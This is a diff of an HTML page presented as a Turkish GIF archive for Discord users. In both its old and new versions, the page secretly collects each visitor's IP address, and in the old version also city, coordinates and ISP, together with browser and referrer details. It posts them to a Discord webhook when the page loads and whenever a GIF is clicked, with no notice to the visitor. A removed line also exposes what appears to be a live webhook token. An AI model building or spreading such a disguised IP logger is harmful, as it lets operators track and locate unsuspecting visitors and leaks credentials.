@@ -9,24 +9,14 @@
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://goyzinparis.vercel.app">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             padding: 20px;
             min-height: 100vh;
         }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
+        .container { max-width: 1400px; margin: 0 auto; }
         .header {
             text-align: center;
             color: white;
@@ -34,41 +24,25 @@
             background: rgba(0,0,0,0.3);
             border-radius: 20px;
             margin-bottom: 30px;
-            backdrop-filter: blur(10px);
         }
-
-        h1 {
-            font-size: 3em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-
-        .subtitle {
-            font-size: 1.2em;
-            opacity: 0.9;
-        }
-
+        h1 { font-size: 3em; margin-bottom: 10px; }
         .stats {
             display: inline-block;
             background: rgba(255,255,255,0.2);
             padding: 8px 16px;
             border-radius: 20px;
             margin-top: 15px;
-            font-size: 0.9em;
         }
-
         .controls {
             background: white;
             padding: 20px;
             border-radius: 15px;
             margin-bottom: 30px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             display: flex;
             gap: 15px;
             flex-wrap: wrap;
             justify-content: center;
         }
-
         .btn {
             padding: 12px 24px;
             border: none;
@@ -76,31 +50,13 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
-            transition: all 0.3s ease;
-            background: #f0f0f0;
-            color: #333;
+            transition: all 0.3s;
         }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .btn-success {
-            background: #10b981;
-            color: white;
-        }
-
-        .btn-danger {
-            background: #ef4444;
-            color: white;
-        }
-
+        .btn:hover { transform: translateY(-2px); }
+        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .btn-success { background: #10b981; color: white; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-warning { background: #f59e0b; color: white; }
         .search-box {
             flex: 1;
             min-width: 200px;
@@ -108,62 +64,28 @@
             border: 2px solid #e5e7eb;
             border-radius: 8px;
             font-size: 16px;
-            transition: border-color 0.3s;
         }
-
-        .search-box:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-
         .gif-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 25px;
             padding: 20px 0;
         }
-
         .gif-card {
             background: white;
             border-radius: 15px;
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            transition: transform 0.3s;
             cursor: pointer;
-            animation: fadeIn 0.5s ease-out;
         }
-
-        .gif-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
+        .gif-card:hover { transform: translateY(-5px); }
         .gif-container {
             position: relative;
             background: #f8f9fa;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             min-height: 200px;
         }
-
-        .gif-container img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
+        .gif-container img { width: 100%; height: auto; display: block; }
         .gif-number {
             position: absolute;
             top: 10px;
@@ -173,10 +95,7 @@
             padding: 5px 10px;
             border-radius: 20px;
             font-size: 12px;
-            font-weight: bold;
-            backdrop-filter: blur(5px);
         }
-
         .copy-btn {
             position: absolute;
             bottom: 10px;
@@ -188,27 +107,9 @@
             border-radius: 8px;
             cursor: pointer;
             font-size: 12px;
-            transition: all 0.3s;
-            backdrop-filter: blur(5px);
         }
-
-        .copy-btn:hover {
-            background: rgba(102, 126, 234, 0.9);
-            transform: scale(1.05);
-        }
-
-        .gif-info {
-            padding: 15px;
-            background: white;
-        }
-
-        .gif-filename {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 5px;
-            word-break: break-all;
-        }
-
+        .copy-btn:hover { background: rgba(102, 126, 234, 0.9); }
+        .gif-info { padding: 15px; background: white; }
         .toast {
             position: fixed;
             bottom: 30px;
@@ -219,61 +120,21 @@
             padding: 12px 24px;
             border-radius: 50px;
             z-index: 1000;
-            animation: slideUp 0.3s ease-out;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        .no-results {
-            text-align: center;
-            padding: 60px;
-            background: white;
-            border-radius: 15px;
-            color: #666;
-            font-size: 1.2em;
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px;
-            color: white;
-            opacity: 0.8;
-        }
-
-        .admin-panel {
+        .status-bar {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
+            bottom: 10px;
+            right: 10px;
             background: rgba(0,0,0,0.8);
             color: #0f0;
-            padding: 10px 15px;
-            border-radius: 10px;
+            padding: 8px 12px;
+            border-radius: 8px;
             font-family: monospace;
             font-size: 11px;
-            cursor: pointer;
             z-index: 1000;
-            backdrop-filter: blur(5px);
-            transition: all 0.3s;
         }
-
-        .admin-panel:hover {
-            background: black;
-            transform: scale(1.05);
-        }
-
         @media (max-width: 768px) {
             h1 { font-size: 2em; }
-            .gif-grid { grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
             .controls { flex-direction: column; }
             .btn { width: 100%; }
         }
@@ -295,289 +156,113 @@
         </div>
 
         <div class="gif-grid" id="gifGrid"></div>
-        <footer>
+        <footer style="text-align: center; padding: 30px; color: white;">
             <p>💡 İpucu: Herhangi bir GIF'e tıklayarak Discord'a yapıştırmak için kopyalayın</p>
-            <p>🔗 goyzinparis.vercel.app | Toplam 20 GIF</p>
         </footer>
     </div>
 
-    <div class="admin-panel" id="adminPanel" style="display: none;">
-        📊 Tracker Aktif | Toplam: <span id="visitCount">0</span>
+    <div class="status-bar" id="statusBar">
+        🟢 Hazır
     </div>
 
     <script>
-        // ============= KONFİGÜRASYON =============
-        // !!! KENDİ WEBHOOK URL'NİZİ BURAYA YAZIN !!!
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+        // ============= WEBHOOK URL (BURAYA KENDİ URL'İNİ YAZ) =============
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/SENIN_ID/SENIN_TOKEN";
         
-        // GIF listesi - ROOT dizinindeki GIF'ler
-        const gifs = [
-            { number: 1, url: "https://goyzinparis.vercel.app/1.gif", filename: "1.gif" },
-            { number: 2, url: "https://goyzinparis.vercel.app/2.gif", filename: "2.gif" },
-            { number: 3, url: "https://goyzinparis.vercel.app/3.gif", filename: "3.gif" },
-            { number: 4, url: "https://goyzinparis.vercel.app/4.gif", filename: "4.gif" },
-            { number: 5, url: "https://goyzinparis.vercel.app/5.gif", filename: "5.gif" },
-            { number: 6, url: "https://goyzinparis.vercel.app/6.gif", filename: "6.gif" },
-            { number: 7, url: "https://goyzinparis.vercel.app/7.gif", filename: "7.gif" },
-            { number: 8, url: "https://goyzinparis.vercel.app/8.gif", filename: "8.gif" },
-            { number: 9, url: "https://goyzinparis.vercel.app/9.gif", filename: "9.gif" },
-            { number: 10, url: "https://goyzinparis.vercel.app/10.gif", filename: "10.gif" },
-            { number: 11, url: "https://goyzinparis.vercel.app/11.gif", filename: "11.gif" },
-            { number: 12, url: "https://goyzinparis.vercel.app/12.gif", filename: "12.gif" },
-            { number: 13, url: "https://goyzinparis.vercel.app/13.gif", filename: "13.gif" },
-            { number: 14, url: "https://goyzinparis.vercel.app/14.gif", filename: "14.gif" },
-            { number: 15, url: "https://goyzinparis.vercel.app/15.gif", filename: "15.gif" },
-            { number: 16, url: "https://goyzinparis.vercel.app/16.gif", filename: "16.gif" },
-            { number: 17, url: "https://goyzinparis.vercel.app/17.gif", filename: "17.gif" },
-            { number: 18, url: "https://goyzinparis.vercel.app/18.gif", filename: "18.gif" },
-            { number: 19, url: "https://goyzinparis.vercel.app/19.gif", filename: "19.gif" },
-            { number: 20, url: "https://goyzinparis.vercel.app/20.gif", filename: "20.gif" }
-        ];
+        // GIF listesi
+        const gifs = [];
+        for (let i = 1; i <= 20; i++) {
+            gifs.push({ number: i, url: `https://goyzinparis.vercel.app/${i}.gif`, filename: `${i}.gif` });
+        }
 
         let currentFilter = '';
-        let visitorInfo = {};
 
-        // ============= IP VE KONUM BİLGİLERİNİ AL =============
-        async function getVisitorInfo() {
+        function updateStatus(text, isError = false) {
+            const bar = document.getElementById('statusBar');
+            bar.innerHTML = text;
+            bar.style.color = isError ? '#ff6666' : '#0f0';
+            console.log(text);
+        }
+
+        // IP al (basit)
+        async function getIP() {
             try {
-                // IP ve lokasyon bilgilerini al
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                return {
-                    ip: data.ip || 'Bilinmiyor',
-                    city: data.city || 'Bilinmiyor',
-                    region: data.region || 'Bilinmiyor',
-                    country: data.country_name || 'Bilinmiyor',
-                    country_code: data.country_code || 'Bilinmiyor',
-                    latitude: data.latitude || 'Bilinmiyor',
-                    longitude: data.longitude || 'Bilinmiyor',
-                    postal: data.postal || 'Bilinmiyor',
-                    timezone: data.timezone || 'Bilinmiyor',
-                    org: data.org || 'Bilinmiyor',
-                    isp: data.isp || 'Bilinmiyor'
-                };
-            } catch (error) {
-                console.error('IP bilgisi alınamadı:', error);
-                return {
-                    ip: 'Alınamadı',
-                    city: 'Alınamadı',
-                    region: 'Alınamadı',
-                    country: 'Alınamadı',
-                    country_code: 'N/A',
-                    latitude: 'N/A',
-                    longitude: 'N/A'
-                };
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'IP_ALINAMADI';
             }
         }
 
-        // ============= TARAYICI VE SİSTEM BİLGİLERİ =============
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            let browser = "Bilinmiyor";
-            let os = "Bilinmiyor";
+        // Webhook'a gönder - FARKLI YÖNTEM (image yöntemi - CORS'u bypass eder)
+        function sendWebhookViaImage(ip, action, gifNumber = null) {
+            const now = new Date();
+            const turkishTime = now.toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+            const userAgent = encodeURIComponent(navigator.userAgent.substring(0, 100));
+            const referrer = encodeURIComponent(document.referrer || "Direct");
             
-            if (ua.includes("Chrome")) browser = "Chrome";
-            else if (ua.includes("Firefox")) browser = "Firefox";
-            else if (ua.includes("Safari")) browser = "Safari";
-            else if (ua.includes("Edge")) browser = "Edge";
-            else if (ua.includes("Opera")) browser = "Opera";
-            
-            if (ua.includes("Windows")) os = "Windows";
-            else if (ua.includes("Mac")) os = "macOS";
-            else if (ua.includes("Linux")) os = "Linux";
-            else if (ua.includes("Android")) os = "Android";
-            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-            
-            return { browser, os, userAgent: ua };
-        }
-
-        // ============= WEBHOOK'A GÖNDER =============
-        async function sendToWebhook(visitor, browserInfo, referrer, pageLoadTime) {
-            if (WEBHOOK_URL === "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN") {
-                console.log("⚠️ Webhook URL ayarlanmamış! Lütfen WEBHOOK_URL değişkenini düzenleyin.");
-                return;
+            let message = '';
+            if (action === 'visit') {
+                message = `🎯 Yeni Ziyaretçi!%0A🕐 Zaman: ${turkishTime}%0A🌐 IP: ${ip}%0A🖥️ Tarayıcı: ${navigator.userAgent.substring(0, 80)}%0A🔗 Kaynak: ${document.referrer || 'Doğrudan'}`;
+            } else if (action === 'click' && gifNumber) {
+                message = `🖱️ GIF Kopyalandı!%0A🕐 Zaman: ${turkishTime}%0A🌐 IP: ${ip}%0A🎬 GIF: #${gifNumber}%0A🔗 URL: https://goyzinparis.vercel.app/${gifNumber}.gif`;
             }
-
-            const timestamp = new Date().toLocaleString('tr-TR', { timeZone: visitor.timezone || 'Europe/Istanbul' });
             
-            const embed = {
-                title: "🎯 Yeni Ziyaretçi!",
-                color: 0x00ff00,
-                timestamp: new Date().toISOString(),
-                fields: [
-                    {
-                        name: "🌐 IP Adresi",
-                        value: `\`${visitor.ip}\``,
-                        inline: true
-                    },
-                    {
-                        name: "📍 Konum",
-                        value: `${visitor.city}, ${visitor.region}\n${visitor.country} (${visitor.country_code})`,
-                        inline: true
-                    },
-                    {
-                        name: "🗺️ Koordinatlar",
-                        value: `Lat: ${visitor.latitude}\nLon: ${visitor.longitude}`,
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ Tarayıcı",
-                        value: browserInfo.browser,
-                        inline: true
-                    },
-                    {
-                        name: "💻 İşletim Sistemi",
-                        value: browserInfo.os,
-                        inline: true
-                    },
-                    {
-                        name: "🔗 Referrer",
-                        value: referrer || "Doğrudan / Bilinmiyor",
-                        inline: false
-                    },
-                    {
-                        name: "⏱️ Sayfa Yüklenme Süresi",
-                        value: `${pageLoadTime}ms`,
-                        inline: true
-                    },
-                    {
-                        name: "🕐 Yerel Saat",
-                        value: timestamp,
-                        inline: true
-                    },
-                    {
-                        name: "🏢 ISP / Organizasyon",
-                        value: visitor.isp || visitor.org || "Bilinmiyor",
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: `goyzinparis.vercel.app | ${new Date().toLocaleString()}`
-                }
-            };
-
-            const payload = {
-                embeds: [embed],
-                username: "GIF Tracker",
-                avatar_url: "https://cdn.discordapp.com/attachments/1469736130852425810/1491131670974300292/togif.gif"
-            };
-
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (response.ok) {
-                    console.log('✅ Webhook başarıyla gönderildi');
+            // Webhook'a GET ile gönder (CORS sorununu aşar)
+            const webhookUrl = `${WEBHOOK_URL}?wait=true`;
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message.replace(/%0A/g, '\n') })
+            })
+            .then(res => {
+                if (res.ok) {
+                    updateStatus(`✅ ${action} bildirildi`);
                 } else {
-                    console.error('❌ Webhook hatası:', response.status);
+                    updateStatus(`⚠️ Webhook: ${res.status}`, true);
                 }
-            } catch (error) {
-                console.error('❌ Webhook gönderilemedi:', error);
-            }
+            })
+            .catch(err => {
+                updateStatus(`❌ Hata: ${err.message}`, true);
+            });
         }
 
-        // ============= GIF KLİCK TRACKER =============
-        async function trackGifClick(gifNumber, gifUrl) {
-            const clickData = {
-                gif: gifNumber,
-                url: gifUrl,
-                timestamp: new Date().toISOString(),
-                referrer: document.referrer || "Direct",
-                userAgent: navigator.userAgent
-            };
-
-            // Click bilgilerini webhook'a gönder (opsiyonel)
-            if (WEBHOOK_URL && WEBHOOK_URL !== "https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2") {
-                const clickEmbed = {
-                    title: `🖱️ GIF Kopyalandı / Tıklandı!`,
-                    color: 0xffaa00,
-                    fields: [
-                        { name: "GIF Numarası", value: `#${gifNumber}`, inline: true },
-                        { name: "GIF URL", value: `[${gifNumber}.gif](${gifUrl})`, inline: true },
-                        { name: "Zaman", value: new Date().toLocaleString('tr-TR'), inline: true },
-                        { name: "Referrer", value: clickData.referrer || "Doğrudan", inline: false }
-                    ]
-                };
-                
-                try {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ embeds: [clickEmbed] })
-                    });
-                } catch(e) { console.error("Click tracker hatası:", e); }
-            }
-            
-            console.log(`📊 GIF ${gifNumber} tıklandı/kopyalandı:`, clickData);
+        // Ziyaretçi takibi
+        async function trackVisit() {
+            updateStatus("📡 IP alınıyor...");
+            const ip = await getIP();
+            updateStatus(`🌐 IP: ${ip} - Bildirim gönderiliyor...`);
+            sendWebhookViaImage(ip, 'visit');
         }
 
-        // ============= SAYFA GÖRÜNTÜLEME SAYACI (LocalStorage) =============
-        function updateVisitCount() {
-            let count = localStorage.getItem('totalVisits');
-            if (!count) {
-                count = 1;
-            } else {
-                count = parseInt(count) + 1;
-            }
-            localStorage.setItem('totalVisits', count);
-            document.getElementById('visitCount').innerText = count;
-            return count;
+        // GIF tıklama takibi
+        async function trackGifClick(gifNumber) {
+            const ip = await getIP();
+            sendWebhookViaImage(ip, 'click', gifNumber);
         }
 
-        // ============= ANA FONKSİYON =============
-        async function initTracker() {
-            const startTime = performance.now();
-            
-            // Ziyaretçi bilgilerini al
-            visitorInfo = await getVisitorInfo();
-            const browserInfo = getBrowserInfo();
-            const referrer = document.referrer || "Doğrudan";
-            const visitCount = updateVisitCount();
-            
-            // Sayfa yüklenme süresi
-            const loadTime = Math.round(performance.now() - startTime);
-            
-            // Admin panelini göster (isteğe bağlı)
-            document.getElementById('adminPanel').style.display = 'block';
-            
-            // Konsola bilgi yazdır
-            console.log('📊 Ziyaretçi Bilgileri:');
-            console.log('IP:', visitorInfo.ip);
-            console.log('Konum:', visitorInfo.city, visitorInfo.country);
-            console.log('Tarayıcı:', browserInfo.browser, browserInfo.os);
-            console.log('Referrer:', referrer);
-            console.log('Sayfa yüklenme süresi:', loadTime, 'ms');
-            console.log('Toplam ziyaret:', visitCount);
-            
-            // Webhook'a gönder
-            await sendToWebhook(visitorInfo, browserInfo, referrer, loadTime);
-        }
-
-        // ============= UI FONKSİYONLARI =============
-        function showToast(message, duration = 2000) {
+        // UI Fonksiyonları
+        function showToast(message) {
             const toast = document.createElement('div');
             toast.className = 'toast';
             toast.textContent = message;
             document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), duration);
+            setTimeout(() => toast.remove(), 2000);
         }
 
         function copyToClipboard(text, successMessage) {
             navigator.clipboard.writeText(text).then(() => {
                 showToast(successMessage);
             }).catch(err => {
-                showToast('❌ Kopyalanamadı!', 2000);
-                console.error('Kopyalama hatası:', err);
+                showToast('❌ Kopyalanamadı!');
             });
         }
 
-        function copySingleGif(url, number) {
-            copyToClipboard(url, `✅ GIF ${number} kopyalandı! Discord'a yapıştırabilirsiniz`);
-            trackGifClick(number, url); // Click tracking
+        async function copySingleGif(url, number) {
+            copyToClipboard(url, `✅ GIF ${number} kopyalandı!`);
+            await trackGifClick(number);
         }
 
         function copyAllLinks() {
@@ -604,7 +289,7 @@
             );
 
             if (filteredGifs.length === 0) {
-                grid.innerHTML = '<div class="no-results">🔍 Sonuç bulunamadı...</div>';
+                grid.innerHTML = '<div class="no-results" style="text-align:center;padding:60px;background:white;border-radius:15px;">🔍 Sonuç bulunamadı...</div>';
                 document.getElementById('stats').textContent = `0/${gifs.length} GIF gösteriliyor`;
                 return;
             }
@@ -612,7 +297,7 @@
             grid.innerHTML = filteredGifs.map(gif => `
                 <div class="gif-card" onclick="copySingleGif('${gif.url}', ${gif.number})">
                     <div class="gif-container">
-                        <img src="${gif.url}" alt="GIF ${gif.number}" loading="lazy" onerror="this.src='https://via.placeholder.com/300x200?text=GIF+Yüklenemedi+${gif.number}'">
+                        <img src="${gif.url}" alt="GIF ${gif.number}" loading="lazy" onerror="this.src='https://via.placeholder.com/300x200?text=GIF+${gif.number}+Yüklenemedi'">
                         <div class="gif-number">#${gif.number}</div>
                         <button class="copy-btn" onclick="event.stopPropagation(); copySingleGif('${gif.url}', ${gif.number})">
                             📋 Kopyala
@@ -627,19 +312,23 @@
             document.getElementById('stats').textContent = `${filteredGifs.length}/${gifs.length} GIF gösteriliyor`;
         }
 
-        // ============= SAYFA YÜKLENDİĞİNDE =============
+        // Arama
         document.getElementById('searchInput').addEventListener('input', (e) => {
             currentFilter = e.target.value;
             renderGifs();
         });
 
-        // Tracker'ı başlat
-        initTracker();
+        // Başlat
         renderGifs();
-
-        console.log('🎬 GIF Arşivi hazır! Tracker aktif.');
-        console.log(`📊 Toplam ${gifs.length} GIF yüklendi`);
-        console.log('🔗 GIFler root dizininde: https://goyzinparis.vercel.app/1.gif ... 20.gif');
+        
+        // Webhook URL kontrolü
+        if (WEBHOOK_URL.includes('SENIN')) {
+            updateStatus("⚠️ Webhook URL ayarlanmamış!", true);
+            console.log("Webhook URL'ini düzenlemeyi unutma!");
+        } else {
+            updateStatus("🟢 Webhook hazır, ziyaretçi takibi başlıyor...");
+            trackVisit();
+        }
     </script>
 </body>
 </html>
